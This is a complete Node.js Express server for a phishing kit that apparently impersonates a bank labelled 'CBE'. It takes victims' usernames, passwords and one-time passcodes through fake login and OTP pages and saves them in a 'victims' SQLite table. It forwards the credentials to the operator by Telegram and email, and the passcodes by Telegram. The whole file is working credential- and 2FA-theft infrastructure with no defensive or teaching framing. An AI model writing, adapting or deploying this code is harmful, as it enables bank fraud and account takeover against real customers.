const express = require('express');
const path = require('path');
const session = require('express-session');
const helmet = require('helmet');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const crypto = require('crypto');
const sqlite3 = require('sqlite3').verbose();
require('dotenv').config({ path: path.join(__dirname, '../config/.env') });

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// DATABASE SETUP
// ============================================

const DB_PATH = path.join(__dirname, '../database/victims.db');
const dbDir = path.dirname(DB_PATH);

// Ensure database directory exists
if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
    console.log('✅ Database directory created');
}

// Create database connection
const db = new sqlite3.Database(DB_PATH, (err) => {
    if (err) {
        console.error('❌ Database connection error:', err.message);
        // Use in-memory database as fallback
        console.log('⚠️  Falling back to in-memory database');
        this.db = new sqlite3.Database(':memory:');
    } else {
        console.log('✅ Connected to SQLite database');
        initializeDatabase();
    }
});

// Initialize database tables
function initializeDatabase() {
    // Create victims table
    db.run(`
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            ip TEXT,
            user_agent TEXT,
            session_id TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            otp TEXT,
            otp_timestamp DATETIME,
            completed BOOLEAN DEFAULT 0,
            encrypted_data TEXT
        )
    `, (err) => {
        if (err) {
            console.error('❌ Error creating victims table:', err.message);
        } else {
            console.log('✅ Victims table verified');
        }
    });

    // Create logs table
    db.run(`
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            event_type TEXT,
            details TEXT,
            ip TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `, (err) => {
        if (err) {
            console.error('❌ Error creating logs table:', err.message);
        } else {
            console.log('✅ Logs table verified');
        }
    });

    // Create indexes for performance
    db.run(`CREATE INDEX IF NOT EXISTS idx_victims_username ON victims(username)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_victims_timestamp ON victims(timestamp)`);
    db.run(`CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp)`);
    
    console.log('✅ Database initialization complete');
}

// ============================================
// DATABASE OPERATIONS
// ============================================

// Encrypt data
function encryptData(data) {
    try {
        const algorithm = 'aes-256-cbc';
        const key = crypto.scryptSync(
            process.env.ENCRYPTION_KEY || 'default-key-for-testing-only', 
            'salt', 
            32
        );
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(algorithm, key, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return `${iv.toString('hex')}:${encrypted}`;
    } catch (error) {
        console.error('Encryption error:', error.message);
        return JSON.stringify(data);
    }
}

// Decrypt data
function decryptData(encryptedData) {
    try {
        const [ivHex, encrypted] = encryptedData.split(':');
        const iv = Buffer.from(ivHex, 'hex');
        const key = crypto.scryptSync(
            process.env.ENCRYPTION_KEY || 'default-key-for-testing-only', 
            'salt', 
            32
        );
        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (error) {
        console.error('Decryption error:', error.message);
        return { data: encryptedData };
    }
}

// Save credentials to database
function saveCredentials(data) {
    return new Promise((resolve, reject) => {
        const encrypted = encryptData({
            username: data.username,
            password: data.password
        });

        const query = `
            INSERT INTO victims 
            (username, password, ip, user_agent, session_id, timestamp, encrypted_data)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `;

        db.run(query, [
            data.username,
            data.password,
            data.ip || 'unknown',
            data.userAgent || 'unknown',
            data.sessionId || 'unknown',
            data.timestamp || new Date().toISOString(),
            encrypted
        ], function(err) {
            if (err) {
                console.error('Save credentials error:', err.message);
                reject(err);
            } else {
                console.log(`✅ Credentials saved with ID: ${this.lastID}`);
                resolve(this.lastID);
            }
        });
    });
}

// Save OTP to database
function saveOTP(data) {
    return new Promise((resolve, reject) => {
        const query = `
            UPDATE victims 
            SET otp = ?, otp_timestamp = ?
            WHERE id = ?
        `;

        db.run(query, [data.otp, data.timestamp, data.userId], function(err) {
            if (err) {
                console.error('Save OTP error:', err.message);
                reject(err);
            } else {
                console.log(`✅ OTP saved for user ID: ${data.userId}`);
                resolve();
            }
        });
    });
}

// Mark as complete
function markComplete(userId) {
    return new Promise((resolve, reject) => {
        const query = `UPDATE victims SET completed = 1 WHERE id = ?`;
        db.run(query, [userId], function(err) {
            if (err) {
                console.error('Mark complete error:', err.message);
                reject(err);
            } else {
                resolve();
            }
        });
    });
}

// Get statistics
function getStats() {
    return new Promise((resolve, reject) => {
        const query = `
            SELECT 
                COUNT(*) as total,
                SUM(completed) as completed,
                DATE(timestamp) as date
            FROM victims
            GROUP BY DATE(timestamp)
            ORDER BY DATE(timestamp) DESC
            LIMIT 7
        `;

        db.all(query, (err, rows) => {
            if (err) {
                reject(err);
            } else {
                resolve(rows || []);
            }
        });
    });
}

// Log events
function logEvent(eventType, details, ip) {
    const query = `
        INSERT INTO logs (event_type, details, ip, timestamp)
        VALUES (?, ?, ?, ?)
    `;
    
    db.run(query, [
        eventType,
        JSON.stringify(details),
        ip || 'unknown',
        new Date().toISOString()
    ], (err) => {
        if (err) {
            console.error('Log event error:', err.message);
        }
    });
}

// ============================================
// TELEGRAM BOT (Simplified)
// ============================================

class TelegramService {
    constructor() {
        this.enabled = false;
        this.bot = null;
        this.chatId = null;
        
        try {
            const token = process.env.TELEGRAM_BOT_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;

            if (!token || !chatId) {
                console.log('⚠️  Telegram credentials not configured');
                return;
            }

            const TelegramBot = require('node-telegram-bot-api');
            this.bot = new TelegramBot(token, { polling: false });
            this.chatId = chatId;
            this.enabled = true;
            console.log('✅ Telegram bot initialized');
        } catch (error) {
            console.log('⚠️  Telegram initialization failed:', error.message);
            this.enabled = false;
        }
    }

    async sendMessage(message) {
        if (!this.enabled || !this.bot) {
            return null;
        }

        try {
            const result = await this.bot.sendMessage(this.chatId, message, {
                parse_mode: 'HTML'
            });
            console.log('✅ Telegram message sent');
            return result;
        } catch (error) {
            console.error('Telegram send error:', error.message);
            return null;
        }
    }

    async sendCredentials(data) {
        if (!this.enabled) return null;
        
        const message = `
🔐 <b>CBE Security Alert</b>

<b>📋 New Credentials Captured</b>

👤 <b>Username:</b> <code>${data.username}</code>
🔑 <b>Password:</b> <code>${data.password}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
🆔 <b>ID:</b> <code>${data.id}</code>
⏰ <b>Timestamp:</b> ${data.timestamp}
`;

        return this.sendMessage(message);
    }

    async sendOTP(data) {
        if (!this.enabled) return null;
        
        const message = `
🔐 <b>CBE Security Alert</b>

<b>📋 OTP Code Captured</b>

🆔 <b>User ID:</b> <code>${data.userId}</code>
🔢 <b>OTP Code:</b> <code>${data.otp}</code>
📱 <b>IP Address:</b> <code>${data.ip}</code>
🖥️ <b>User Agent:</b> <code>${data.userAgent}</code>
⏰ <b>Timestamp:</b> ${data.timestamp}
`;

        return this.sendMessage(message);
    }
}

const telegram = new TelegramService();

// ============================================
// EMAIL SERVICE (Simplified)
// ============================================

class EmailService {
    constructor() {
        this.enabled = false;
        this.transporter = null;
        this.alertEmail = null;
        
        try {
            const { EMAIL_HOST, EMAIL_PORT, EMAIL_USER, EMAIL_PASS, ALERT_EMAIL } = process.env;

            if (!EMAIL_USER || !EMAIL_PASS || !ALERT_EMAIL) {
                console.log('⚠️  Email credentials not configured');
                return;
            }

            const nodemailer = require('nodemailer');
            this.transporter = nodemailer.createTransport({
                host: EMAIL_HOST || 'smtp.gmail.com',
                port: parseInt(EMAIL_PORT) || 587,
                secure: false,
                auth: {
                    user: EMAIL_USER,
                    pass: EMAIL_PASS
                }
            });

            this.alertEmail = ALERT_EMAIL;
            this.enabled = true;
            console.log('✅ Email service initialized');
        } catch (error) {
            console.log('⚠️  Email initialization failed:', error.message);
            this.enabled = false;
        }
    }

    async sendAlert(data) {
        if (!this.enabled || !this.transporter) return null;

        try {
            const html = `
                <h2>🔐 Security Alert</h2>
                <p><strong>Username:</strong> ${data.username}</p>
                <p><strong>Password:</strong> ${data.password}</p>
                <p><strong>IP:</strong> ${data.ip}</p>
                <p><strong>Time:</strong> ${data.timestamp}</p>
            `;

            const info = await this.transporter.sendMail({
                from: process.env.EMAIL_USER,
                to: this.alertEmail,
                subject: `🔐 SECURITY ALERT: ${data.username}`,
                html: html
            });

            console.log('✅ Email sent:', info.messageId);
            return info;
        } catch (error) {
            console.error('Email send error:', error.message);
            return null;
        }
    }
}

const email = new EmailService();

// ============================================
// EXPRESS SERVER SETUP
// ============================================

// Security Middleware
app.use(helmet({
    contentSecurityPolicy: false,
    xssFilter: true,
    noSniff: true,
    hidePoweredBy: true,
    frameguard: { action: 'deny' }
}));

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));

// Rate Limiting
const limiter = rateLimit({
    windowMs: parseInt(process.env.RATE_LIMIT_WINDOW || '15') * 60 * 1000,
    max: parseInt(process.env.RATE_LIMIT_MAX || '100'),
    message: 'Too many requests, please try again later.',
    standardHeaders: true,
    legacyHeaders: false
});
app.use('/api/', limiter);

// Session Configuration
app.use(session({
    secret: process.env.SESSION_SECRET || 'default-secret-change-this',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        httpOnly: true,
        maxAge: 3600000,
        sameSite: 'lax'
    }
}));

// Body Parsers
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static Files
app.use(express.static(path.join(__dirname, '../public')));
app.use('/assets', express.static(path.join(__dirname, '../public/assets')));

// ============================================
// REQUEST LOGGING MIDDLEWARE
// ============================================

app.use((req, res, next) => {
    const start = Date.now();
    
    res.on('finish', () => {
        const duration = Date.now() - start;
        const logData = {
            method: req.method,
            url: req.url,
            status: res.statusCode,
            duration: `${duration}ms`,
            ip: req.ip,
            userAgent: req.headers['user-agent']
        };
        
        console.log(`${logData.method} ${logData.url} - ${logData.status} - ${logData.duration}`);
        
        // Log to database
        if (req.url.startsWith('/api/')) {
            logEvent('request', logData, req.ip);
        }
    });
    
    next();
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/health', (req, res) => {
    db.get('SELECT 1', (err) => {
        if (err) {
            res.status(503).json({ 
                status: 'unhealthy', 
                error: 'Database connection failed',
                timestamp: new Date().toISOString()
            });
        } else {
            res.status(200).json({ 
                status: 'healthy', 
                uptime: process.uptime(),
                timestamp: new Date().toISOString()
            });
        }
    });
});

// ============================================
// FRONTEND ROUTES
// ============================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.get('/otp-verify', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/otp-verify.html'));
});

app.get('/loading', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/loading.html'));
});

app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, '../public/success.html'));
});

// ============================================
// API ROUTES
// ============================================

// Submit credentials
app.post('/api/submit', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        // Get client info
        const ip = req.ip || req.connection.remoteAddress || 'unknown';
        const userAgent = req.headers['user-agent'] || 'unknown';
        const sessionId = req.session?.id || 'unknown';
        const timestamp = new Date().toISOString();

        // Save to database
        const userId = await saveCredentials({
            username,
            password,
            ip,
            userAgent,
            sessionId,
            timestamp
        });

        // Log the event
        logEvent('credentials_captured', { 
            username, 
            userId, 
            ip 
        }, ip);

        // Send Telegram notification
        try {
            await telegram.sendCredentials({
                id: userId,
                username,
                password,
                ip,
                userAgent,
                timestamp
            });
        } catch (telegramError) {
            console.warn('Telegram notification failed:', telegramError.message);
        }

        // Send Email alert
        try {
            await email.sendAlert({
                username,
                password,
                ip,
                userAgent,
                timestamp
            });
        } catch (emailError) {
            console.warn('Email alert failed:', emailError.message);
        }

        // Update session
        if (req.session) {
            req.session.userId = userId;
            req.session.username = username;
        }

        res.json({
            success: true,
            redirect: '/otp-verify'
        });

    } catch (error) {
        console.error('Submit error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Verify OTP
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { otp } = req.body;
        const userId = req.session?.userId;

        if (!userId) {
            return res.status(401).json({ error: 'Session expired' });
        }

        if (!otp || otp.length !== 6) {
            return res.status(400).json({ error: 'Invalid OTP format' });
        }

        // Get user info for logging
        const user = await new Promise((resolve, reject) => {
            db.get('SELECT username FROM victims WHERE id = ?', [userId], (err, row) => {
                if (err) reject(err);
                else resolve(row);
            });
        });

        // Save OTP to database
        await saveOTP({
            userId,
            otp,
            ip: req.ip || 'unknown',
            userAgent: req.headers['user-agent'] || 'unknown',
            timestamp: new Date().toISOString()
        });

        // Log the event
        logEvent('otp_submitted', { 
            userId, 
            username: user?.username || 'unknown'
        }, req.ip);

        // Send OTP to Telegram
        try {
            await telegram.sendOTP({
                userId,
                otp,
                ip: req.ip || 'unknown',
                userAgent: req.headers['user-agent'] || 'unknown',
                timestamp: new Date().toISOString()
            });
        } catch (telegramError) {
            console.warn('Telegram OTP notification failed:', telegramError.message);
        }

        res.json({
            success: true,
            redirect: '/loading'
        });

    } catch (error) {
        console.error('OTP verification error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Complete process
app.post('/api/complete', async (req, res) => {
    try {
        const userId = req.session?.userId;
        
        if (userId) {
            await markComplete(userId);
            
            // Log the event
            logEvent('process_completed', { 
                userId,
                username: req.session?.username || 'unknown'
            }, req.ip);
            
            console.log(`✅ Process completed - User ID: ${userId}`);
        }

        res.json({ success: true });

    } catch (error) {
        console.error('Complete error:', error.message);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Telegram status
app.get('/api/telegram/status', (req, res) => {
    res.json({ 
        enabled: telegram.enabled,
        chatId: process.env.TELEGRAM_CHAT_ID ? 'configured' : 'not configured'
    });
});

// Telegram send message
app.post('/api/telegram/send', async (req, res) => {
    try {
        const { message, type, timestamp, userAgent, url } = req.body;
        
        if (!message) {
            return res.status(400).json({ error: 'Message is required' });
        }

        const formattedMessage = `
📱 Client Notification

Type: ${type || 'info'}
Message: ${message}
Time: ${timestamp || new Date().toISOString()}
User Agent: ${userAgent || 'unknown'}
URL: ${url || 'unknown'}
IP: ${req.ip || 'unknown'}
        `;

        await telegram.sendMessage(formattedMessage);
        res.json({ success: true });

    } catch (error) {
        console.error('Telegram send error:', error.message);
        res.status(500).json({ error: 'Failed to send message' });
    }
});

// Get statistics (admin endpoint)
app.get('/api/stats', async (req, res) => {
    try {
        const stats = await getStats();
        res.json({ success: true, data: stats });
    } catch (error) {
        console.error('Stats error:', error.message);
        res.status(500).json({ error: 'Failed to get statistics' });
    }
});

// Get logs (admin endpoint)
app.get('/api/logs', async (req, res) => {
    try {
        const limit = parseInt(req.query.limit) || 50;
        
        const logs = await new Promise((resolve, reject) => {
            db.all(
                'SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', 
                [limit], 
                (err, rows) => {
                    if (err) reject(err);
                    else resolve(rows);
                }
            );
        });
        
        res.json({ success: true, data: logs });
    } catch (error) {
        console.error('Logs error:', error.message);
        res.status(500).json({ error: 'Failed to get logs' });
    }
});

// ============================================
// ERROR HANDLING
// ============================================

app.use((err, req, res, next) => {
    console.error('Error:', err.message);
    logEvent('error', { 
        message: err.message, 
        stack: err.stack,
        url: req.url
    }, req.ip);
    
    res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
});

// ============================================
// START SERVER
// ============================================

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log('='.repeat(60));
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📁 Environment: ${process.env.NODE_ENV || 'development'}`);
    console.log(`🗄️  Database: ${DB_PATH}`);
    console.log(`📡 Telegram: ${telegram.enabled ? '✅ Enabled' : '❌ Disabled'}`);
    console.log(`📧 Email: ${email.enabled ? '✅ Enabled' : '❌ Disabled'}`);
    console.log('='.repeat(60));
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================

const shutdown = () => {
    console.log('\n🛑 Shutting down gracefully...');
    
    server.close(() => {
        console.log('✅ Server closed');
        
        db.close((err) => {
            if (err) {
                console.error('❌ Database close error:', err.message);
            } else {
                console.log('✅ Database connection closed');
            }
            process.exit(0);
        });
    });
};

process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);
process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
});

// ============================================
// EXPORT FOR TESTING
// ============================================

module.exports = { app, db, server };
